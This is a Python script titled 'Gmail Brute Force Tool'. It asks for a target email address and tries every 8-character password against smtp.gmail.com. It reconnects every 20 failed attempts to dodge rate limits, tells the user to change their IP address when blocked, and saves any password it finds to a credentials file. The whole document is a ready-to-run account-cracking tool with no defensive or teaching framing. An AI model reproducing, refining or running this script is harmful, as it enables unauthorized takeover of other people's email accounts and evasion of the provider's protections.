import smtplib
import itertools
import string
import time
import sys

def generate_passwords(length=8):
    characters = string.ascii_letters + string.digits + string.punctuation
    for password in itertools.product(characters, repeat=length):
        yield ''.join(password)

def start_brute_force(account, smtp_server, delay=5):
    count = 0
    total_attempts = 0
    
    for password in generate_passwords():
        try:
            smtp_server.login(account, password)
            print(f"\n[+] Valid password found: {password}, for: {account}")
            
            with open('credentials.txt', 'a') as data_file:
                data_file.write(f"\n--------------------------------------->")
                data_file.write(f"[+] Email: {account}\n")
                data_file.write(f"[+] Password: {password}\n")
                data_file.write("--------------------------------------->")
            
            return True
        
        except smtplib.SMTPAuthenticationError:
            count += 1
            total_attempts += 1
            
            if count == 20:
                print(f"\n[!] Sleeping for {delay} seconds.")
                time.sleep(delay)
                count = 0
                smtp_server.close()
                smtp_server = start_smtp_service()
            else:
                print(f"\rAttempt {total_attempts}: {password}", end="")
                sys.stdout.flush()
        
        except Exception as e:
            if "please run connect() first" in str(e):
                smtp_server.close()
                print("\nThe SMTP server disconnected. Please try again later or change your IP address.")
                return False
            else:
                print(f"Error: {str(e)}")
    
    print("\n[-] Password not found. Exhausted all possibilities.")
    return False

def start_smtp_service():
    smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
    smtp_server.ehlo()
    smtp_server.starttls()
    return smtp_server

def main():
    print("\n\t\t\t[>] Gmail Brute Force Tool [<]\n")
    
    account = input("Enter the target email address: ")
    
    smtp_server = start_smtp_service()
    start_brute_force(account, smtp_server)

if __name__ == "__main__":
    main()
